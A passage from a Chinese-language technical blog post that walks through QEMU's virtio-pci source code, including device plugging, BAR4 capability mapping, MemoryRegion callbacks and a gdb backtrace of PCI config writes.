class="keyword">if</span> (err != -ENOTSUP) &#123;</span><br><span class="line">                warn_report(<span class="string">&quot;unable to init msix vectors to %&quot;</span> PRIu32,</span><br><span class="line">                            proxy-&gt;nvectors);</span><br><span class="line">            &#125;</span><br><span class="line">            proxy-&gt;nvectors = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    proxy-&gt;pci_dev.config_write = virtio_write_config;</span><br><span class="line">    proxy-&gt;pci_dev.config_read = virtio_read_config;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (legacy) &#123;</span><br><span class="line">        size = VIRTIO_PCI_REGION_SIZE(&amp;proxy-&gt;pci_dev)</span><br><span class="line">            + virtio_bus_get_vdev_config_len(bus);</span><br><span class="line">        size = pow2ceil(size);</span><br><span class="line"></span><br><span class="line">        memory_region_init_io(&amp;proxy-&gt;bar, OBJECT(proxy),</span><br><span class="line">                              &amp;virtio_pci_config_ops,</span><br><span class="line">                              proxy, <span class="string">&quot;virtio-pci&quot;</span>, size);</span><br><span class="line"></span><br><span class="line">        pci_register_bar(&amp;proxy-&gt;pci_dev, proxy-&gt;legacy_io_bar_idx,</span><br><span class="line">                         PCI_BASE_ADDRESS_SPACE_IO, &amp;proxy-&gt;bar);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* A VirtIODevice is being plugged */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">virtio_bus_device_plugged</span><span class="params">(VirtIODevice *vdev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceState *qdev = DEVICE(vdev);</span><br><span class="line">    BusState *qbus = BUS(qdev_get_parent_bus(qdev));</span><br><span class="line">    VirtioBusState *bus = VIRTIO_BUS(qbus);</span><br><span class="line">    VirtioBusClass *klass = VIRTIO_BUS_GET_CLASS(bus);</span><br><span class="line">    VirtioDeviceClass *vdc = VIRTIO_DEVICE_GET_CLASS(vdev);</span><br><span class="line">    <span class="type">bool</span> has_iommu = virtio_host_has_feature(vdev, VIRTIO_F_IOMMU_PLATFORM);</span><br><span class="line">    <span class="type">bool</span> vdev_has_iommu;</span><br><span class="line">    Error *local_err = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    DPRINTF(<span class="string">&quot;%s: plug device.\n&quot;</span>, qbus-&gt;name);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (klass-&gt;device_plugged != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        klass-&gt;device_plugged(qbus-&gt;parent, &amp;local_err);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，在<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-pci.c#L2089"><strong>virtio_pci_device_plugged()</strong></a>中完成了<strong>PCI配置空间</strong>的设置。</p><p>整体来看，<strong>virtio设备</strong>实例化时会分别实例化<strong>virtio transport</strong>和<strong>virtio设备</strong>，这样子具有更好的拓展性。</p><h2 id="virtio设置"><a href="#virtio设置" class="headerlink" title="virtio设置"></a>virtio设置</h2><p>在qemu实例化完<strong>virtio-net-pci</strong>设备后，需要与<strong>guest驱动</strong>通信完成<strong>virtio</strong>的设置，即virtio各个组件的设置</p><h3 id="virtio结构的配置空间"><a href="#virtio结构的配置空间" class="headerlink" title="virtio结构的配置空间"></a>virtio结构的配置空间</h3><p>根据前面<a href="#virtio-transport">virtio transport</a>章节可知，<strong>virtio-net-pci</strong>设备<strong>PCI配置空间</strong>的capability指定着virtio各个组件的配置空间</p><p><img src="virtio的PCI配置空间.png" alt="virtio的PCI配置空间"></p><p>因此首先就需要设置<strong>virtio结构的配置空间</strong>，即根据capability确定组件配置空间的<strong>BAR</strong>。</p><p>在前面<a href="#实例化">virtio设备的实例化</a>中，<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-pci.c#L2089"><strong>virtio_pci_device_plugged()</strong></a>将所有capability配置空间设置在<strong>proxy-&gt;modern_bar</strong>上。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This is called by virtio-bus just after the device is plugged. */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_pci_device_plugged</span><span class="params">(DeviceState *d, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_cap</span> <span class="title">cap</span> =</span> &#123;</span><br><span class="line">        .cap_len = <span class="keyword">sizeof</span> cap,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_notify_cap</span> <span class="title">notify</span> =</span> &#123;</span><br><span class="line">        .cap.cap_len = <span class="keyword">sizeof</span> notify,</span><br><span class="line">        .notify_off_multiplier =</span><br><span class="line">            cpu_to_le32(virtio_pci_queue_mem_mult(proxy)),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_cfg_cap</span> <span class="title">cfg</span> =</span> &#123;</span><br><span class="line">        .cap.cap_len = <span class="keyword">sizeof</span> cfg,</span><br><span class="line">        .cap.cfg_type = VIRTIO_PCI_CAP_PCI_CFG,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_notify_cap</span> <span class="title">notify_pio</span> =</span> &#123;</span><br><span class="line">        .cap.cap_len = <span class="keyword">sizeof</span> notify,</span><br><span class="line">        .notify_off_multiplier = cpu_to_le32(<span class="number">0x0</span>),</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_cfg_cap</span> *<span class="title">cfg_mask</span>;</span></span><br><span class="line">    ...</span><br><span class="line">    virtio_pci_modern_mem_region_map(proxy, &amp;proxy-&gt;common, &amp;cap);</span><br><span class="line">    virtio_pci_modern_mem_region_map(proxy, &amp;proxy-&gt;isr, &amp;cap);</span><br><span class="line">    virtio_pci_modern_mem_region_map(proxy, &amp;proxy-&gt;device, &amp;cap);</span><br><span class="line">    virtio_pci_modern_mem_region_map(proxy, &amp;proxy-&gt;notify, &amp;notify.cap);</span><br><span class="line">    ...</span><br><span class="line">    pci_register_bar(&amp;proxy-&gt;pci_dev, proxy-&gt;modern_mem_bar_idx,</span><br><span class="line">                     PCI_BASE_ADDRESS_SPACE_MEMORY |</span><br><span class="line">                     PCI_BASE_ADDRESS_MEM_PREFETCH |</span><br><span class="line">                     PCI_BASE_ADDRESS_MEM_TYPE_64,</span><br><span class="line">                     &amp;proxy-&gt;modern_bar);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_pci_modern_mem_region_map</span><span class="params">(VirtIOPCIProxy *proxy,</span></span><br><span class="line"><span class="params">                                             VirtIOPCIRegion *region,</span></span><br><span class="line"><span class="params">                                             <span class="keyword">struct</span> virtio_pci_cap *cap)</span></span><br><span class="line">&#123;</span><br><span class="line">    virtio_pci_modern_region_map(proxy, region, cap,</span><br><span class="line">                                 &amp;proxy-&gt;modern_bar, proxy-&gt;modern_mem_bar_idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_pci_modern_region_map</span><span class="params">(VirtIOPCIProxy *proxy,</span></span><br><span class="line"><span class="params">                                         VirtIOPCIRegion *region,</span></span><br><span class="line"><span class="params">                                         <span class="keyword">struct</span> virtio_pci_cap *cap,</span></span><br><span class="line"><span class="params">                                         MemoryRegion *mr,</span></span><br><span class="line"><span class="params">                                         <span class="type">uint8_t</span> bar)</span></span><br><span class="line">&#123;</span><br><span class="line">    memory_region_add_subregion(mr, region-&gt;offset, &amp;region-&gt;mr);</span><br><span class="line"></span><br><span class="line">    cap-&gt;cfg_type = region-&gt;type;</span><br><span class="line">    cap-&gt;bar = bar;</span><br><span class="line">    cap-&gt;offset = cpu_to_le32(region-&gt;offset);</span><br><span class="line">    cap-&gt;length = cpu_to_le32(region-&gt;size);</span><br><span class="line">    virtio_pci_add_mem_cap(proxy, cap);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>而<strong>proxy-&gt;modern_mem_bar_idx</strong>在<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-pci.c#L2272"><strong>virtio_pci_realize()</strong></a>中被设置为4，即capability配置空间被设置在<strong>BAR4</strong>上<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_pci_realize</span><span class="params">(PCIDevice *pci_dev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * virtio pci bar layout used by default.</span></span><br><span class="line"><span class="comment">     * subclasses can re-arrange things if needed.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *   region 0   --  virtio legacy io bar</span></span><br><span class="line"><span class="comment">     *   region 1   --  msi-x bar</span></span><br><span class="line"><span class="comment">     *   region 2   --  virtio modern io bar (off by default)</span></span><br><span class="line"><span class="comment">     *   region 4+5 --  virtio modern memory (64bit) bar</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    proxy-&gt;modern_mem_bar_idx = <span class="number">4</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>根据<a href="/2024/08/04/qemu%E7%9A%84PCI%E8%AE%BE%E5%A4%87/" title="qemu的PCI设备">qemu的PCI设备</a>可知，<strong>guest驱动</strong>在<strong>PCI配置空间</strong>中设置<strong>BAR4</strong>的物理地址即可完成virtio结构的配置空间的设置<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  pci_default_write_config (d=0x5555580bdd70, addr=32, val_in=4294967295, l=4) at ../../qemu/hw/pci/pci.c:1594</span></span><br><span class="line"><span class="comment">//#1  0x0000555555b729ad in virtio_write_config (pci_dev=0x5555580bdd70, address=32, val=4294967295, len=4) at ../../qemu/hw/virtio/virtio-pci.c:747</span></span><br><span class="line"><span class="comment">//#2  0x0000555555aa0c9a in pci_host_config_write_common (pci_dev=0x5555580bdd70, addr=32, limit=256, val=4294967295, len=4) at ../../qemu/hw/pci/pci_host.c:96</span></span><br><span class="line"><span class="comment">//#3  0x0000555555aa0ee6 in pci_data_write (s=0x555557430730, addr=2147489824, val=4294967295, len=4) at ../../qemu/hw/pci/pci_host.c:138</span></span><br><span class="line"><span class="comment">//#4  0x0000555555aa10bb in pci_host_data_write (opaque=0x5555573f9ad0, addr=0, val=4294967295, len=4) at ../../qemu/hw/pci/pci_host.c:188</span></span><br><span class="line"><span class="comment">//#5  0x0000555555e1e25a in memory_region_write_accessor (mr=0x5555573f9f10, addr=0, value=0x7ffff65ff598, size=4, shift=0, mask=4294967295, attrs=...) at ../../qemu/system/memory.c:497</span></span><br><span class="line"><span class="comment">//#6  0x0000555555e1e593 in access_with_adjusted_size (addr=0, value=0x7ffff65ff598, size=4, access_size_min=1, access_size_max=4, access_fn=0x555555e1e160 &lt;memory_region_write_accessor&gt;, mr=0x5555573f9f10, attrs=...) at ../../qemu/system/memory.c:573</span></span><br><span class="line"><span class="comment">//#7  0x0000555555e218ad in memory_region_dispatch_write (mr=0x5555573f9f10, addr=0, data=4294967295, op=MO_32, attrs=...) at ../../qemu/system/memory.c:1521</span></span><br><span class="line"><span class="comment">//#8  0x0000555555e2fffa in flatview_write_continue_step (attrs=..., buf=0x7ffff7f8a000 &quot;\377\377\377\377&quot;, len=4, mr_addr=0, l=0x7ffff65ff680, mr=0x5555573f9f10) at ../../qemu/system/physmem.c:2713</span></span><br><span class="line"><span class="comment">//#9  0x0000555555e300ca in flatview_write_continue (fv=0x7ffee8043b90, addr=3324, attrs=..., ptr=0x7ffff7f8a000, len=4, mr_addr=0, l=4, mr=0x5555573f9f10) at ../../qemu/system/physmem.c:2743</span></span><br><span class="line"><span class="comment">//#10 0x0000555555e301dc in flatview_write (fv=0x7ffee8043b90, addr=3324, attrs=..., buf=0x7ffff7f8a000, len=4) at ../../qemu/system/physmem.c:2774</span></span><br><span class="line"><span class="comment">//#11 0x0000555555e3062a in address_space_write (as=0x555557055e80 &lt;address_space_io&gt;, addr=3324, attrs=..., buf=0x7ffff7f8a000, len=4) at ../../qemu/system/physmem.c:2894</span></span><br><span class="line"><span class="comment">//#12 0x0000555555e306a6 in address_space_rw (as=0x555557055e80 &lt;address_space_io&gt;, addr=3324, attrs=..., buf=0x7ffff7f8a000, len=4, is_write=true) at ../../qemu/system/physmem.c:2904</span></span><br><span class="line"><span class="comment">//#13 0x0000555555e89cd0 in kvm_handle_io (port=3324, attrs=..., data=0x7ffff7f8a000, direction=1, size=4, count=1) at ../../qemu/accel/kvm/kvm-all.c:2631</span></span><br><span class="line"><span class="comment">//#14 0x0000555555e8a640 in kvm_cpu_exec (cpu=0x5555573bc6a0) at ../../qemu/accel/kvm/kvm-all.c:2903</span></span><br><span class="line"><span class="comment">//#15 0x0000555555e8d712 in kvm_vcpu_thread_fn (arg=0x5555573bc6a0) at ../../qemu/accel/kvm/kvm-accel-ops.c:50</span></span><br><span class="line"><span class="comment">//#16 0x00005555560b6f08 in qemu_thread_start (args=0x5555573c5850) at ../../qemu/util/qemu-thread-posix.c:541</span></span><br><span class="line"><span class="comment">//#17 0x00007ffff7694ac3 in start_thread (arg=&lt;optimized out&gt;) at ./nptl/pthread_create.c:442</span></span><br><span class="line"><span class="comment">//#18 0x00007ffff7726850 in clone3 () at ../sysdeps/unix/sysv/linux/x86_64/clone3.S:81</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pci_default_write_config</span><span class="params">(PCIDevice *d, <span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> val_in, <span class="type">int</span> l)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (ranges_overlap(addr, l, PCI_BASE_ADDRESS_0, <span class="number">24</span>) ||</span><br><span class="line">        ranges_overlap(addr, l, PCI_ROM_ADDRESS, <span class="number">4</span>) ||</span><br><span class="line">        ranges_overlap(addr, l, PCI_ROM_ADDRESS1, <span class="number">4</span>) ||</span><br><span class="line">        range_covers_byte(addr, l, PCI_COMMAND))</span><br><span class="line">        pci_update_mappings(d);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="virtio组件"><a href="#virtio组件" class="headerlink" title="virtio组件"></a>virtio组件</h3><p>根据前面<a href="#virtio-transport">virtio transport</a>章节，virtio组件通过对应的配置空间进行设置。而virtio结构的配置空间在前面<a href="#virtio结构的配置空间">virtio结构的配置空间</a>完成初始化，映射入<strong>AddressSpace</strong>中。 此时<strong>guest</strong>即可通过读写组件的配置空间完成组件的设置</p><p>具体的，在实例化时<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-pci.c#L2089"><strong>virtio_pci_device_plugged()</strong></a>为每一个virito结构的配置空间分配了一个单独的MemoryRegion，则<strong>guest</strong>读写组件的配置空间即可触发对应MemoryRegion的回调函数，完成virtio组件的设置<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This is called by virtio-bus just after the device is plugged. */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_pci_device_plugged</span><span class="params">(DeviceState *d, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    virtio_pci_modern_regions_init(proxy, vdev-&gt;name);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_pci_modern_regions_init</span><span class="params">(VirtIOPCIProxy *proxy,</span></span><br><span class="line"><span class="params">                                           <span class="type">const</span> <span class="type">char</span> *vdev_name)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> MemoryRegionOps common_ops = &#123;</span><br><span class="line">        .read = virtio_pci_common_read,</span><br><span class="line">        .write = virtio_pci_common_write,</span><br><span class="line">        .impl = &#123;</span><br><span class="line">            .min_access_size = <span class="number">1</span>,</span><br><span class="line">            .max_access_size = <span class="number">4</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> MemoryRegionOps isr_ops = &#123;</span><br><span class="line">        .read = virtio_pci_isr_read,</span><br><span class="line">        .write = virtio_pci_isr_write,</span><br><span class="line">        .impl = &#123;</span><br><span class="line">            .min_access_size = <span class="number">1</span>,</span><br><span class="line">            .max_access_size = <span class="number">4</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> MemoryRegionOps device_ops = &#123;</span><br><span class="line">        .read = virtio_pci_device_read,</span><br><span class="line">        .write = virtio_pci_device_write,</span><br><span class="line">        .impl = &#123;</span><br><span class="line">            .min_access_size = <span class="number">1</span>,</span><br><span class="line">            .max_access_size = <span class="number">4</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> MemoryRegionOps notify_ops = &#123;</span><br><span class="line">        .read = virtio_pci_notify_read,</span><br><span class="line">        .write = virtio_pci_notify_write,</span><br><span class="line">        .impl = &#123;</span><br><span class="line">            .min_access_size = <span class="number">1</span>,</span><br><span class="line">            .max_access_size = <span class="number">4</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> MemoryRegionOps notify_pio_ops = &#123;</span><br><span class="line">        .read = virtio_pci_notify_read,</span><br><span class="line">        .write = virtio_pci_notify_write_pio,</span><br><span class="line">        .impl = &#123;</span><br><span class="line">            .min_access_size = <span class="number">1</span>,</span><br><span class="line">            .max_access_size = <span class="number">4</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> MemoryRegionOps lm_ops = &#123;</span><br><span class="line">        .read = virtio_pci_lm_read,</span><br><span class="line">        .write = virtio_pci_lm_write,</span><br><span class="line">        .impl = &#123;</span><br><span class="line">            .min_access_size = <span class="number">1</span>,</span><br><span class="line">            .max_access_size = <span class="number">4</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">    &#125;;</span><br><span class="line">    g_autoptr(GString) name = g_string_new(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    g_string_printf(name, <span class="string">&quot;virtio-pci-common-%s&quot;</span>, vdev_name);</span><br><span class="line">    memory_region_init_io(&amp;proxy-&gt;common.mr, OBJECT(proxy),</span><br><span class="line">                          &amp;common_ops,</span><br><span class="line">                          proxy,</span><br><span class="line">                          name-&gt;str,</span><br><span class="line">                          proxy-&gt;common.size);</span><br><span class="line"></span><br><span class="line">    g_string_printf(name, <span class="string">&quot;virtio-pci-isr-%s&quot;</span>, vdev_name);</span><br><span class="line">    memory_region_init_io(&amp;proxy-&gt;isr.mr, OBJECT(proxy),</span><br><span class="line">                          &amp;isr_ops,</span><br><span class="line">                          proxy,</span><br><span class="line">                          name-&gt;str,</span><br><span class="line">                          proxy-&gt;isr.size);</span><br><span class="line"></span><br><span class="line">    g_string_printf(name, <span class="string">&quot;virtio-pci-device-%s&quot;</span>, vdev_name);</span><br><span class="line">    memory_region_init_io(&amp;proxy-&gt;device.mr, OBJECT(proxy),</span><br><span class="line">                          &amp;device_ops,</span><br><span class="line">                          proxy,</span><br><span class="line">                          name-&gt;str,</span><br><span class="line">                          proxy-&gt;device.size);</span><br><span class="line"></span><br><span class="line">    g_string_printf(name, <span class="string">&quot;virtio-pci-notify-%s&quot;</span>, vdev_name);</span><br><span class="line">    memory_region_init_io(&amp;proxy-&gt;notify.mr, OBJECT(proxy),</span><br><span class="line">                          &amp;notify_ops,</span><br><span class="line">                          proxy,</span><br><span class="line">                          name-&gt;str,</span><br><span class="line">                          proxy-&gt;notify.size);</span><br><span class="line"></span><br><span class="line">    g_string_printf(name, <span class="string">&quot;virtio-pci-notify-pio-%s&quot;</span>, vdev_name);</span><br><span class="line">    memory_region_init_io(&amp;proxy-&gt;notify_pio.mr, OBJECT(proxy),</span><br><span class="line">                          &amp;notify_pio_ops,</span><br><span class="line">                          proxy,</span><br><span class="line">                          name-&gt;str,</span><br><span class="line">                          proxy-&gt;notify_pio.size);</span><br><span class="line">    <span class="keyword">if</span> (proxy-&gt;flags &amp; VIRTIO_PCI_FLAG_VDPA) &#123;</span><br><span class="line">        g_string_printf(name, <span class="string">&quot;virtio-pci-lm-%s&quot;</span>, vdev_name);</span><br><span class="line">        memory_region_init_io(&amp;proxy-&gt;lm.mr, OBJECT(proxy),</span><br><span class="line">                          &amp;lm_ops,</span><br><span class="line">                          proxy,</span><br><span class="line">                          name-&gt;str,</span><br><span class="line">                          proxy-&gt;lm.size);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里重点介绍一下<strong>VIRTIO_PCI_CAP_COMMON_CFG</strong>设置空间的回调函数，根据前面<a href="#配置空间">VIRTIO_PCI_CAP_COMMON_CFG配置空间</a>章节可知，读写其字段可以设置<strong>virtqueue</strong>和<strong>feature bits</strong>等组件。根据前面<a href="#virtio组件">virtio组件</a>章节中代码可知，qemu使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-pci.c#L1686"><strong>virtio_pci_common_writes()</strong></a>来进行设置的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span 